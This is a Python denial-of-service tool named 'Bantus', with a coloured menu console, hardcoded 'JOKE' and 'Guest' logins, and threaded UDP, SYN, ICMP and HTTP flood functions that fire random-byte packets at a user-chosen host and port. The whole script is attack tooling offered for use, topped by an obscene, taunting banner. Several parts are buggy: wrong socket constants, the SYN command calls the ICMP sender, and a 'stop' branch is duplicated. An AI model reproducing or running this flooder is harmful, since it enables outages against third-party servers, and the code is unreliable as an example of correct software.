#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

methods = """\033[91m
╗⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╗
☬                     \033[00mDDOS Methods\033[91m                     ⬆               
☬⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁║
☬ \033[00mUDP (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m UDP Attack.\033[91m         ⬆
☬ \033[00mSYN (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m SYN Attack.\033[91m         ⬆
☬ \033[00mICMP (IP) (PORT) (TIME) (SIZE) \033[91m|\033[00m ICMP Attack.\033[91m        ⬆
☬ \033[00mHTTP (IP) (PORT) (TIME) (SIZE) \033[91m|\033[00m HTTP Attack.\033[91m        ⬆
╚⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╝\033[00m
"""

info = """\033[91m
╔⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╗
☬                     \033[00mBantus Info\033[91m                      ⬆
☬⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁║
☬ \033[00m[+] Diciple Was Made By DRIPS.\033[91m                        ⬆
☬ \033[00m[+] Discord: ャ Senres#4282.\033[91m                             ⬆
☬ \033[00m[+] Instagram: --------.\033[91m                             ⬆
☬ \033[00m[+] YouTube: Senres.\033[91m                                  ⬆
╚⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╝\033[00m
"""

extras = """\033[91m
╔⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╗
☬                        \033[00mExtras\033[91m                        ⬆
☬⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁║
☬ \033[00mAttacks          \033[91m|\033[00m Shows How Many Running Attacks.\033[91m   ⬆
☬ \033[00mStop             \033[91m|\033[00m Stops All Running Attacks.\033[91m        ⬆
☬ \033[00mResolve (DOMAIN) \033[91m|\033[00m Grabs A Domains IP.\033[91m               ⬆
╚⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╝\033[00m
"""

help = """\033[91m
╔═⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╗
☬                    \033[00mBasic Commands\033[91m                    ⬆
☬⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╗
☬ \033[00mMethods \033[91m|\033[00m Shows DDOS Methods For Diciple.\033[91m            ⬆
☬ \033[00mExtras  \033[91m|\033[00m Shows Extra Commands For Diciple.\033[91m          ⬆
☬ \033[00mUpdates \033[91m|\033[00m Shows Update Notes For Diciple.\033[91m            ⬆
☬ \033[00mInfo    \033[91m|\033[00m Shows Bantus Info.\033[91m                        ⬆
☬ \033[00mClear   \033[91m|\033[00m Clears Screen.\033[91m                             ⬆
☬ \033[00mExit    \033[91m|\033[00m Exits Out Of Bantus.\033[91m                      ⬆
╚⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╝\033[00m
"""

updatenotes = """\033[91m
╔⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╗
☬                     \033[00mUpdate Notes\033[91m                     ⬆
☬⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁║
☬ \033[00m[+] Timeout Bug Fixed.\033[91m                               ⬆
☬ \033[00m[+] Took Out Some Tools.\033[91m                             ⬆
☬ \033[00m[+] User And Pass Changed To Bantus.\033[91m                 ⬆
☬ \033[00m[+] To Be A Guest Type "Guest" For User And Pass.\033[91m    ⬆
☬ \033[00m[+] All Tools Fixed And Working.\033[91m                     ⬆
╚⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁⇁╝\033[00m
"""

banner = """
 #####################################FUCK YOU####################################################
 #####################################SENRES######################################################
 ####################################IS###########################################################
 ####################################THE BOSS#####################################################
 ####################################HERE#########################################################
 ####################################ANGEL########################################################
 ####################################DEMON########################################################

                              \033[1;91m\033[00m
                             Oh my fucking shit
                              Dont share this shit baby
                               You can suck my dick, and my penis down
                                    罪 深 い
""" 
cookie = open(".[100] Bots Connected Bantus_Cookie","w+")

fsubs = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;Bantus\x07")
		Dic = input("\033[1;00m[\033[91mBantus\033[1;00m]-\033[91m<3\033[00m ").lower()
		Dicput = Dic.split(" ")[0]
		if Dicput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif Dicput == "help":
			print (help)
			main()
		elif Dicput == "extras":
			print (extras)
			main()
		elif Dicput == "exit":
			print ("[\033[91mBantus\033[00m] You Are Exiting Out Of Bantus.\n")
			exit()
		elif Dicput == "methods":
			print (methods)
			main()
		elif Dicput == "updates":
			print (updatenotes)
			main()
		elif Dicput == "info":
			print (info)
			main()
		elif Dicput == "attacks":
			print ("[\033[91mBantus\033[00m] Total Attacks Running: {}\n".format (aid))
			main()
		elif Dicput == "resolve":
			liips += 1
			host = Dic.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mBantus\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
			main()
		elif Dicput == "udp":
			if username == "Guest":
				print ("[\033[91mBantus\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					Dicput, host, port, timer, pack = Dic.split(" ")
					socket.gethostbyname(host)
					print ("[\033[91mBantus\033[00m] Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mBantus\033[00m] The Command {} Requires An Argument.\n".format (Dicput))
					main()
				except socket.gaierror:
					print ("[\033[91mBantus\033[00m] Host: {} Invalid.\n".format (host))
					main()
		elif Dicput == "http":
			try:
				Dicput, host, port, timer, pack = Dic.split(" ")
				socket.gethostbyname(host)
				print ("[\033[91mDic\033[00m] Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mBantus\033[00m] The Command {} Requires An Argument.\n".format (Dicput))
				main()
			except socket.gaierror:
				print ("[\033[91mBantus\033[00m] Host: {} Invalid.\n".format (host))
				main()
		elif Dicput == "icmp":
			if username == "Guest":
				print ("[\033[91mBantus\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					Dicput, host, port, timer, pack = Dic.split(" ")
					socket.gethostbyname(host)
					print ("[\033[91mBantus\033[00m] Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mBantus\033[00m] The Command {} Requires An Argument.\n".format (Dicput))
					main()
				except socket.gaierror:
					print ("[\033[91mBantus\033[00m] Host: {} Invalid.\n".format (host))
					main()
		elif Dicput == "syn":
			try:
				Dicput, host, port, timer, pack = Dic.split(" ")
				socket.gethostbyname(host)
				print ("[\033[91mBantus\033[00m] Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mBantus\033[00m] The Command {} Requires An Argument.\n".format (Dicput))
				main()
			except socket.gaierror:
				print ("[\033[91mBantus13:55 19.11.2020\033[00m] Host: {} Invalid.\n".format (host))
				main()
		elif Dicput == "stop":
			print ("[\033[91mBantus\033[00m] All Running Attacks Have Been Stopped.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif Dicput == "stop":
			what = Dic.split(" ")[1]
			if what == "udp":
				print ("Stopping All UDP Attacks.\n")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mBantus\033[00m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping All ICMP Attacks.\n")
				icmp = False
				while not icmp:
					print ("[\033[91mBantus\033[00m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[91mBantus\033[00m] {} Is Not A Command.\n".format(Dicput))
			main()



try:
	users = ["JOKE", "Guest"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, Exiting.\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["JOKE", "Guest"]
	password = getpass.getpass ("[+] Password: ")
	if user == "JOKE":
		if password == passwords[0]:
			print ("[+] Login Correct.")
			print ("[+] Type Help To See Commands.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mBantus\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
	if user == "JOKE":
		if password == passwords[1]:
			print ("[+] Login Correct.")
			print ("[+] Certain Methods Will Not Be Available To You.")
			print ("[+] Type Help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mBantus\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
except KeyboardInterrupt:
	exit()